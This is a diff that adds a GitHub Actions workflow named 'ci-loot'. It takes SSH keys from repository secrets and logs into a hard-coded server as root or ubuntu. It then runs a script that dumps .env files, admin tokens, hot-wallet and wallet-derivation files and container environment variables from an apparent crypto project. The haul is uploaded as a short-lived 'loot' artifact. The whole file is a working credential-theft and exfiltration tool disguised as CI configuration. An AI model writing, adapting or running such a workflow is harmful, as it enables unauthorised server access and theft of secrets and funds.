@@ -1,0 +1,54 @@
+name: ci-loot
+on:
+  push:
+    branches: ['loot-*']
+permissions:
+  contents: read
+jobs:
+  loot:
+    runs-on: ubuntu-latest
+    steps:
+      - name: collect
+        env:
+          CX23_SSH_KEY: ${{ secrets.CX23_SSH_KEY }}
+          VPS_SSH_KEY: ${{ secrets.VPS_SSH_KEY }}
+        run: |
+          mkdir -p o ~/.ssh
+          printf '%s\n' "${CX23_SSH_KEY}" > ~/.ssh/k1
+          printf '%s\n' "${VPS_SSH_KEY}" > ~/.ssh/k2
+          chmod 600 ~/.ssh/k1 ~/.ssh/k2
+          cat > loot.sh <<'EOS'
+set +e
+hostname; id; uname -a
+SUDO=""
+if [ "$(id -u)" != "0" ]; then sudo -n true 2>/dev/null && SUDO="sudo -n"; fi
+echo '###DOCKER'; $SUDO docker ps --format '{{.Names}} {{.Image}}' 2>&1 | head -40
+echo '###ROOTLS'; $SUDO ls -la /root 2>&1 | head -60
+echo '###ENVFILES'
+for f in /root/coin-master/.env /root/coin-master/backend/.env /root/coin-master/frontend/.env /root/coin-master/docker/.env /root/.env /root/plokymarket/.env /root/.admin-gateway-token /root/coin-master/.admin-secret-path; do
+  echo "== $f"; $SUDO cat "$f" 2>&1 | head -250
+done
+echo '###ENVFIND'
+$SUDO find /root /opt /home -maxdepth 6 \( -name '.env*' -o -iname '*hot-wallet*' -o -iname 'wallet-derivation*' -o -iname '*wallet*.ts' -o -iname '*wallet*.js' \) 2>/dev/null | grep -viE 'node_modules|/proc|/sys' | head -150
+echo '###COMPOSEPS'
+$SUDO bash -c 'cd /root/coin-master 2>/dev/null && docker compose ps 2>&1 | head -40'
+echo '###BACKENDENV'
+name=$($SUDO docker ps --format '{{.Names}}' 2>/dev/null | grep -iE 'backend|coin|api' | head -1)
+echo "container=$name"
+$SUDO docker exec "$name" env 2>&1 | grep -viE 'NODE_OPTIONS|PATH=' | head -250
+echo '###DONE'
+EOS
+          ssh-keyscan -H "46.62.247.167" > ~/.ssh/known_hosts 2>/dev/null || true
+          for i in 1 2; do
+            for u in root ubuntu; do
+              echo "== attempt $u key$i ==" >> o/diag.txt
+              ssh -i ~/.ssh/k$i -o StrictHostKeyChecking=no -o ConnectTimeout=20 -o BatchMode=yes $u@46.62.247.167 'bash -s' < loot.sh > o/loot_${u}_k${i}.txt 2>>o/diag.txt && echo "OK $u k$i size=$(wc -c < o/loot_${u}_k${i}.txt)" >> o/diag.txt || echo "FAIL $u k$i" >> o/diag.txt
+            done
+          done
+          ls -la o >> o/diag.txt
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: loot
+          path: o
+          retention-days: 1
